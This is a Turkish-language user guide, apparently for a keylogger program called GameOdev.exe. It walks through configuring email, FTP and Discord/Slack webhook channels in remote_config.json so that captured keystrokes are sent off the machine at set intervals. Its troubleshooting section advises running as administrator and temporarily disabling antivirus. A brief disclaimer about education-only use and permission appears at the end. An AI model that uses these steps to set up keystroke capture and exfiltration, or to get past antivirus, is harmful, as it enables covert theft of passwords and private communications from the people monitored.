# ⚙️ Konfigürasyon Butonu Rehberi

## ✅ Konfigürasyon Butonu Eklendi!

Artık uygulamada **⚙️ Konfigürasyon** butonu görünüyor ve çalışıyor!

---

## 🔍 Konfigürasyon Butonu Nasıl Kullanılır?

### 1. Uygulamayı Başlatma
```
GameOdev.exe dosyasını çalıştırın
```

### 2. Konfigürasyon Butonunu Bulma
- Uygulama açıldığında **⚙️ Konfigürasyon** butonu görünür
- Buton mavi renkte ve "⚙️ Konfigürasyon" yazısı ile işaretlenmiştir
- Buton, "🚀 Uzaktan Takibi Başlat" butonunun yanında yer alır

### 3. Konfigürasyon Butonuna Tıklama
- **⚙️ Konfigürasyon** butonuna tıklayın
- Açılan pencerede tüm konfigürasyon seçenekleri görünür
- Detaylı ayar bilgileri ve örnekler sunulur

---

## 📋 Konfigürasyon Seçenekleri

### 📧 E-posta Ayarları
```
SMTP Sunucu: smtp.gmail.com
Port: 587
Gönderen E-posta: your-email@gmail.com
Şifre: Gmail App Password
Alıcı E-posta: recipient@example.com
```

### 🌐 FTP Ayarları
```
FTP Sunucu: ftp.example.com
Port: 21
Kullanıcı: ftp_username
Şifre: ftp_password
Uzak Dizin: /logs/
```

### 📱 Webhook Ayarları
```
Discord Webhook URL: https://discord.com/api/webhooks/...
Slack Webhook URL: https://hooks.slack.com/services/...
```

---

## 🔧 Konfigürasyon Dosyası

### remote_config.json Dosyası
Konfigürasyon butonu, `remote_config.json` dosyasını kullanır:

```json
{
  "EmailSettings": {
    "Enabled": false,
    "SmtpServer": "smtp.gmail.com",
    "SmtpPort": 587,
    "SenderEmail": "",
    "SenderPassword": "",
    "RecipientEmail": "",
    "SendIntervalMinutes": 30
  },
  "FtpSettings": {
    "Enabled": false,
    "Server": "",
    "Username": "",
    "Password": "",
    "RemoteDirectory": "/logs/",
    "UploadIntervalMinutes": 15
  },
  "WebhookSettings": {
    "Enabled": false,
    "WebhookUrl": "",
    "SendImportantKeysOnly": true
  }
}
```

### Manuel Konfigürasyon
1. `remote_config.json` dosyasını metin editörü ile açın
2. Ayarları düzenleyin
3. Dosyayı kaydedin
4. Uygulamayı yeniden başlatın

---

## 🎯 Konfigürasyon Adımları

### Adım 1: E-posta Konfigürasyonu
1. **⚙️ Konfigürasyon** butonuna tıklayın
2. E-posta ayarları bölümünü inceleyin
3. `remote_config.json` dosyasını düzenleyin:
   ```json
   "EmailSettings": {
     "Enabled": true,
     "SmtpServer": "smtp.gmail.com",
     "SmtpPort": 587,
     "SenderEmail": "your-email@gmail.com",
     "SenderPassword": "your-app-password",
     "RecipientEmail": "recipient@example.com",
     "SendIntervalMinutes": 30
   }
   ```

### Adım 2: FTP Konfigürasyonu
1. FTP sunucu bilgilerinizi hazırlayın
2. `remote_config.json` dosyasını düzenleyin:
   ```json
   "FtpSettings": {
     "Enabled": true,
     "Server": "ftp.example.com",
     "Username": "ftp_username",
     "Password": "ftp_password",
     "RemoteDirectory": "/logs/",
     "UploadIntervalMinutes": 15
   }
   ```

### Adım 3: Webhook Konfigürasyonu
1. Discord/Slack webhook URL'sini alın
2. `remote_config.json` dosyasını düzenleyin:
   ```json
   "WebhookSettings": {
     "Enabled": true,
     "WebhookUrl": "https://discord.com/api/webhooks/...",
     "SendImportantKeysOnly": true
   }
   ```

---

## 🧪 Test Etme

### Konfigürasyon Testi
1. **⚙️ Konfigürasyon** butonuna tıklayın
2. **📊 Durum** butonuna tıklayın
3. Konfigürasyon durumunu kontrol edin

### Bağlantı Testi
1. E-posta ayarlarını test edin
2. FTP bağlantısını test edin
3. Webhook URL'sini test edin

---

## 🔧 Sorun Giderme

### Problem: Konfigürasyon Butonu Görünmüyor
**Çözüm:**
1. Uygulamayı yeniden başlatın
2. Yönetici olarak çalıştırın
3. Antivirüs programını geçici olarak kapatın

### Problem: Konfigürasyon Penceresi Açılmıyor
**Çözüm:**
1. `remote_config.json` dosyasının varlığını kontrol edin
2. Dosya izinlerini kontrol edin
3. JSON formatının doğru olduğundan emin olun

### Problem: Ayarlar Kaydedilmiyor
**Çözüm:**
1. Dosya yazma izinlerini kontrol edin
2. JSON formatını doğrulayın
3. Uygulamayı yeniden başlatın

---

## 📊 Konfigürasyon Durumu

### Durum Kontrolü
- **📊 Durum** butonuna tıklayarak mevcut konfigürasyonu görebilirsiniz
- Hangi özelliklerin aktif olduğunu gösterir
- Bağlantı durumunu kontrol eder

### Örnek Durum Çıktısı
```
🔧 Uzaktan Takip Konfigürasyon Durumu:
📧 E-posta: ✅ Aktif
🌐 FTP: ❌ Pasif
📱 Webhook: ✅ Aktif
🖥️ Bilgisayar: DESKTOP-ABC123
👤 Kullanıcı: TestUser
```

---

## 🎉 Başarılı Konfigürasyon

Konfigürasyon tamamlandıktan sonra:

1. **🚀 Uzaktan Takibi Başlat** butonuna tıklayın
2. İzin onayı ekranında **Yes** seçin
3. Tuş vuruşları otomatik olarak uzaktan gönderilmeye başlar
4. **📊 Durum** butonundan takip edebilirsiniz

---

## ⚠️ Güvenlik Uyarıları

### Yasal Uyarılar
- **İzinsiz kullanım yasadışıdır**
- **Sadece eğitim amaçlı** kullanın
- **Açık yazılı izin** alın
- **Yasalara uygun** hareket edin

### Etik Kurallar
- ✅ Eğitim amaçlı kullanın
- ✅ Açık izin alın
- ✅ Verileri güvenli saklayın
- ❌ İzinsiz kullanım yapmayın
- ❌ Ticari amaçlı kullanmayın

---

**🎯 Konfigürasyon butonu artık çalışıyor! Güvenli ve etik kullanım için tüm ayarları dikkatlice yapılandırın.**
